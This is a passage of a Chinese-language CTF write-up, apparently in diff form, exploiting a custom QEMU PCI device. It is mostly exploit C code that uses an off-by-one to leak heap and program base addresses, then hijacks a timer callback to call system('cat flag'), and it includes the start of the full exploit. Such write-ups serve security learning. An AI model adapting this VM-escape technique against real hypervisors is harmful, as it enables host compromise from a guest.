+req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x200</span><span class="token punctuation">;</span>
+<span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] pos += 0x100"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>cmd <span class="token operator">=</span> TIMER<span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x100</span><span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] off-by-one"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>cmd <span class="token operator">=</span> ENC<span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>sub_cmd <span class="token operator">=</span> ENC2<span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x300</span><span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token number">0x300</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"checker = %#lx\n"</span><span class="token punctuation">,</span> <span class="token function">get_checker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="Leak-Heap-Address"><a href="#Leak-Heap-Address" class="headerlink" title="Leak Heap Address"></a>Leak Heap Address</h3><p>可以控制 checker 后，就可以随意多次触发 timer 了，接着下面的步 leak heap</p>
+<ol>
+<li>触发 timer，pos+=0x10，使其越界到 req_addr 指针的位置</li>
+<li>reader，读出 req_addr 指针</li>
+</ol>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] pos += 0x10"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>cmd <span class="token operator">=</span> TIMER<span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x10</span><span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pos = %#lx\n"</span><span class="token punctuation">,</span> <span class="token function">get_pos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] reset cache_addr"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// cache_addr/req_addr</span>
+<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>cmd <span class="token operator">=</span> TIMER<span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pos = %#lx\n"</span><span class="token punctuation">,</span> <span class="token function">get_pos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0x310</span>
+
+<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] reading data  ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// leak &amp;request</span>
+<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>cmd <span class="token operator">=</span> READ<span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x310</span><span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>ptr <span class="token operator">=</span> <span class="token function">gva_to_gpa</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+heap <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x308</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+timer_ptr <span class="token operator">=</span> heap <span class="token operator">+</span> <span class="token number">0x12b8</span><span class="token punctuation">;</span>
+timer_list_ptr <span class="token operator">=</span> heap <span class="token operator">-</span> <span class="token number">0x110e8c8</span><span class="token punctuation">;</span>
+<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"heap address: %#lx\n"</span><span class="token punctuation">,</span> heap<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"timer_ptr: %#lx\n"</span><span class="token punctuation">,</span> timer_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"timer_list_ptr: %#lx\n"</span><span class="token punctuation">,</span> timer_list_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="Leak-Code-Base"><a href="#Leak-Code-Base" class="headerlink" title="Leak Code Base"></a>Leak Code Base</h3><p>接下来要 bypass PIE，泄露程序基址</p>
+<ol>
+<li>此时 pos=0x310，给 timer 设置的触发延时长一点</li>
+<li>利用 encoder 0x2022 功能，再 timer 触发前，修改 req_addr</li>
+<li>timer 触发后，req_addr 已经被修改，再结合 reader 即可任意地址读</li>
+</ol>
+<p>修改 req_addr 为 timer 对象 +0x10 偏移处，这里就是回调函数指针 hfdev_func 的地方了，计算偏移可以找到 system plt 的位置：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] set time delay"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">set_time</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] trigger timer, pos+=8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>cmd <span class="token operator">=</span> TIMER<span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
+<span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] modify cache_addr before timer runing"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>cmd <span class="token operator">=</span> ENC<span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>sub_cmd <span class="token operator">=</span> ENC2<span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x310</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token number">0x308</span><span class="token punctuation">]</span> <span class="token operator">=</span> heap <span class="token operator">^</span> <span class="token punctuation">(</span>timer_ptr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"waiting for timer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// getchar();</span>
+
+<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] reading data  ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// leak &amp;request</span>
+<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>cmd <span class="token operator">=</span> READ<span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x318</span><span class="token punctuation">;</span>
+req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>ptr <span class="token operator">=</span> <span class="token function">gva_to_gpa</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+hfdev_func <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x310</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+cbase <span class="token operator">=</span> hfdev_func <span class="token operator">-</span> <span class="token number">0x381190</span><span class="token punctuation">;</span>
+system <span class="token operator">=</span> cbase <span class="token operator">+</span> <span class="token number">0x2d6614</span><span class="token punctuation">;</span>
+binsh <span class="token operator">=</span> cbase <span class="token operator">+</span> <span class="token number">0x869b82</span><span class="token punctuation">;</span>
+<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hfdev_func = %#lx\n"</span><span class="token punctuation">,</span> hfdev_func<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"cbase = %#lx\n"</span><span class="token punctuation">,</span> cbase<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"system = %#lx\n"</span><span class="token punctuation">,</span> system<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"binsh = %#lx\n"</span><span class="token punctuation">,</span> binsh<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="Hijack-Timer"><a href="#Hijack-Timer" class="headerlink" title="Hijack Timer"></a>Hijack Timer</h3><ol>
+<li>Req 结构体上，构造 fake timer</li>
+<li>此时 pos=0x318，使用 0x2022 功能修改 timer 指针指向 fake timer</li>
+<li>触发 timer 执行 <code>system(&quot;cat flag&quot;)</code></li>
+</ol>
+<hr>
+<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><p>完整 exp 如下：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;errno.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ctype.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;termios.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/io.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stddef.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stddef.h></span></span>
+ 
+<span class="token class-name">uint16_t</span> pmio_base <span class="token operator">=</span> <span class="token number">0xc040</span><span class="token punctuation">;</span>
+<span class="token keyword">int</span> pagemap_fd<span class="token punctuation">;</span>
+
+<span class="token keyword">struct</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>packed<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token class-name">RequestRead</span> <span class="token punctuation">&#123;</span>
+    <span class="token class-name">uint8_t</span> cmd<span class="token punctuation">;</span>
+    <span class="token class-name">uint64_t</span> ptr<span class="token punctuation">;</span>
+    <span class="token class-name">uint16_t</span> size<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+<span class="token keyword">struct</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>packed<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token class-name">RequestTimer</span> <span class="token punctuation">&#123;</span>
+    <span class="token class-name">uint8_t</span> cmd<span class="token punctuation">;</span>
+    <span class="token class-name">uint16_t</span> size<span class="token punctuation">;</span>
+    <span class="token class-name">uint16_t</span> offset<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+<span class="token keyword">struct</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>packed<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token class-name">RequestEnc</span> <span class="token punctuation">&#123;</span>
+    <span class="token class-name">uint8_t</span> cmd<span class="token punctuation">;</span>
+    <span class="token class-name">uint8_t</span> add_key<span class="token punctuation">;</span>
+    <span class="token class-name">uint8_t</span> xor_key<span class="token punctuation">;</span>
+    <span class="token class-name">uint16_t</span> sub_cmd<span class="token punctuation">;</span>
+    <span class="token class-name">uint16_t</span> size<span class="token punctuation">;</span>
+    <span class="token class-name">uint8_t</span> data<span class="token punctuation">[</span><span class="token number">0x400</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+ 
+<span class="token keyword">void</span> <span class="token function">pmio_write</span><span class="token punctuation">(</span><span class="token class-name">uint16_t</span> addr<span class="token punctuation">,</span><span class="token class-name">uint32_t</span> val<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">outw</span><span class="token punctuation">(</span>val<span class="token punctuation">,</span> addr<span class="token operator">+</span>pmio_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+ 
+<span class="token class-name">uint64_t</span> <span class="token function">pmio_read</span><span class="token punctuation">(</span><span class="token class-name">uint16_t</span> addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">uint32_t</span><span class="token punctuation">)</span><span class="token function">inw</span><span class="token punctuation">(</span>addr<span class="token operator">+</span>pmio_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+ 
+ 
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PAGE_SHIFT</span>  <span class="token expression"><span class="token number">12</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PAGE_SIZE</span>   <span class="token expression"><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> PAGE_SHIFT<span class="token punctuation">)</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PFN_PRESENT</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">1ull</span> <span class="token operator">&lt;&lt;</span> <span class="token number">63</span><span class="token punctuation">)</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PFN_PFN</span>     <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1ull</span> <span class="token operator">&lt;&lt;</span> <span class="token number">55</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span></span></span>
+
+<span class="token class-name">uint32_t</span> <span class="token function">page_offset</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> addr<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> addr <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> PAGE_SHIFT<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token class-name">uint64_t</span> <span class="token function">gva_to_gfn</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token class-name">uint64_t</span> pme<span class="token punctuation">,</span> gfn<span class="token punctuation">;</span>
+    <span class="token class-name">size_t</span> offset<span class="token punctuation">;</span>
+    offset <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uintptr_t</span><span class="token punctuation">)</span>addr <span class="token operator">>></span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">7</span><span class="token punctuation">;</span>
+    <span class="token function">lseek</span><span class="token punctuation">(</span>pagemap_fd<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> <span class="token constant">SEEK_SET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">read</span><span class="token punctuation">(</span>pagemap_fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pme<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pme <span class="token operator">&amp;</span> PFN_PRESENT<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+    gfn <span class="token operator">=</span> pme <span class="token operator">&amp;</span> PFN_PFN<span class="token punctuation">;</span>
+    <span class="token keyword">return</span> gfn<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token class-name">uint64_t</span> <span class="token function">gva_to_gpa</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token class-name">uint64_t</span> gfn <span class="token operator">=</span> <span class="token function">gva_to_gfn</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">assert</span><span class="token punctuation">(</span>gfn <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token punctuation">(</span>gfn <span class="token operator">&lt;&lt;</span> PAGE_SHIFT<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">page_offset</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">set_phy_addr</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span> vaddr<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token class-name">uint64_t</span> paddr <span class="token operator">=</span> <span class="token function">gva_to_gpa</span><span class="token punctuation">(</span>vaddr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">pmio_write</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> paddr <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">pmio_write</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> paddr <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">set_request_size</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> size<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token function">pmio_write</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token function">pmio_write</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">set_time</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> time<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token function">pmio_write</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> time<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token class-name">uint64_t</span> <span class="token function">get_pos</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> <span class="token function">pmio_read</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token class-name">uint64_t</span> <span class="token function">get_checker</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> <span class="token function">pmio_read</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token function">pmio_write</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ENC</span> <span class="token expression"><span class="token number">0x10</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">READ</span> <span class="token expression"><span class="token number">0x20</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">TIMER</span> <span class="token expression"><span class="token number">0x30</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ENC1</span> <span class="token expression"><span class="token number">0x2202</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ENC2</span> <span class="token expression"><span class="token number">0x2022</span></span></span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
